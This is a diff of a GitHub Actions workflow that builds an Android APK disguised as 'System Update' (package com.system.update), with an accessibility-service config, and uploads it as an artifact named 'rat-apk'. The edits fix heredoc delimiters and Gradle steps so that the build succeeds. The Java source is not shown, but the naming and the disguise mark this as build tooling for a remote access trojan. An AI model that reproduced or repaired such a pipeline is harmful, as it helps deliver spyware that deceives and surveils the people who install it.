@@ -41,10 +41,9 @@ jobs:
       - name: Clean Old Files
         run: |
           rm -f build.gradle settings.gradle gradle.properties local.properties
-          rm -rf app
-          rm -rf .gradle
+          rm -rf app .gradle
 
-      - name: Create Project Structure
+      - name: Create Project
         run: |
           mkdir -p app/src/main/java/com/system/update
           mkdir -p app/src/main/res/xml
@@ -53,10 +52,17 @@ jobs:
           find . -maxdepth 1 -name "*.java" -exec cp {} app/src/main/java/com/system/update/ \;
           cp AndroidManifest.xml app/src/main/ 2>/dev/null || true
           cp accessibility_config.xml app/src/main/res/xml/ 2>/dev/null || true
+          
+          cat > app/src/main/res/values/strings.xml << 'XMLEOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          XMLEOF
 
       - name: Create Gradle Files
         run: |
-          cat > settings.gradle << 'EOF'
+          cat > settings.gradle << 'GRADLEEOF'
           pluginManagement {
               repositories {
                   google()
@@ -73,24 +79,24 @@ jobs:
           }
           rootProject.name = "SystemUpdate"
           include ':app'
-          EOF
+          GRADLEEOF
 
-          cat > build.gradle << 'EOF'
+          cat > build.gradle << 'GRADLEEOF'
           plugins {
               id 'com.android.application' version '8.1.4' apply false
           }
-          EOF
+          GRADLEEOF
 
-          cat > gradle.properties << 'EOF'
+          cat > gradle.properties << 'GRADLEEOF'
           android.useAndroidX=true
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
-          EOF
+          GRADLEEOF
 
-          cat > local.properties << 'EOF'
+          cat > local.properties << 'GRADLEEOF'
           sdk.dir=/home/runner/android-sdk
-          EOF
+          GRADLEEOF
 
-          cat > app/build.gradle << 'EOF'
+          cat > app/build.gradle << 'GRADLEEOF'
           plugins {
               id 'com.android.application'
           }
@@ -116,20 +122,13 @@ jobs:
           }
           dependencies {
           }
-          EOF
-
-          cat > app/src/main/res/values/strings.xml << 'EOF'
-          <?xml version="1.0" encoding="utf-8"?>
-          <resources>
-              <string name="app_name">System Update</string>
-          </resources>
-          EOF
-
-      - name: Setup Gradle
-        uses: gradle/gradle-build-action@v3
+          GRADLEEOF
 
       - name: Build APK
-        run: gradle assembleDebug --no-daemon --stacktrace
+        run: |
+          gradle wrapper --gradle-version 8.1.4
+          chmod +x gradlew
+          ./gradlew assembleDebug --no-daemon --stacktrace
 
       - name: Upload APK
         if: success()
@@ -137,3 +136,4 @@ jobs:
         with:
           name: rat-apk
           path: app/build/outputs/apk/debug/app-debug.apk
+          if-no-files-found: error
